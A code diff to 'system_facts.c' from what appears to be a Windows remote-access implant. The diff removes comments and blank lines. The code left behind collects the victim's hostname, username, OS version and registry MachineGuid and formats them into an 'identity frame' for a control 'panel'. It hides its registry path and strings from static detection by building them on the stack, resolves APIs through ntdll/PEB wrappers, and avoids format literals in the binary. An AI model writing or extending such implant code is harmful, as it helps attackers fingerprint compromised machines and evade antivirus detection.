@@ -1,7 +1,3 @@
-/* system_facts.c - collect what this agent reports about its machine.
- * The identity frame's UUID and printable facts come from here.
- */
-
 #include "system_facts.h"
 #include "peb.h"
 #include "ntdll.h"
@@ -31,25 +27,21 @@ void collect_system_facts(system_facts *facts)
         facts->hostname[0] = '\0';
     }
 
-    
     if (!ADVAPI_Ctor(&advapi)) {
         facts->username[0] = '\0';
     } else {
         n = sizeof(facts->username);
-        advapi.GetUserNameA(facts->username, &n);           /* advapi32 */
+        advapi.GetUserNameA(facts->username, &n);
     }
 
-    /* RtlGetVersion (ntdll) reports the true OS version; the classic
-     * GetVersionEx lies to apps without a compatibility manifest. */
     if (ntdll.RtlGetVersion) {
         OSVERSIONINFOW info;
-        
+
         MemoryZero(&info, sizeof(info));
         info.dwOSVersionInfoSize = sizeof(info);
-        
+
         if (ntdll.RtlGetVersion(&info) == 0) {
-            /* The version is written digit by digit: a format literal
-             * would be a string in the binary's read-only data. */
+
             INT32 pos = 0;
             UINT32 parts[3];
             volatile UINT32 *pv = parts;
@@ -67,13 +59,6 @@ void collect_system_facts(system_facts *facts)
     }
 }
 
-/* Get the machine UUID from HKLM\...\Cryptography\MachineGuid, converted to
- * the .NET Guid byte order the panel expects. Falls back to all zeros.
- *
- * The registry stores the UUID as text ("00112233-4455-6677-..."); the
- * panel parses the 16 frame bytes as a .NET Guid, whose first three groups
- * (Data1..Data3) are little-endian and whose last group is raw. Hence the
- * reorder at the end: string order -> 33 22 11 00 | 55 44 | 77 66 | raw. */
 void get_machine_uuid(unsigned char out[16])
 {
     char text[64] = { 0 };
@@ -89,7 +74,6 @@ void get_machine_uuid(unsigned char out[16])
         return;
     }
 
-    /* Registry path and value name, built on the stack (stackstrings.h). */
     CHAR regpath[37];
     StrRegPath(regpath);
     CHAR guidname[12];
@@ -119,7 +103,6 @@ void get_machine_uuid(unsigned char out[16])
         advapi.RegCloseKey(key);
     }
 
-    /* Convert hexadecimal characters into 16 bytes. */
     for (p = text; *p != '\0' && digits < 32; p++)
     {
         int v;
@@ -147,7 +130,6 @@ void get_machine_uuid(unsigned char out[16])
         return;
     }
 
-    /* Convert string byte order to .NET Guid byte layout. */
     out[0] = straight[3];
     out[1] = straight[2];
     out[2] = straight[1];
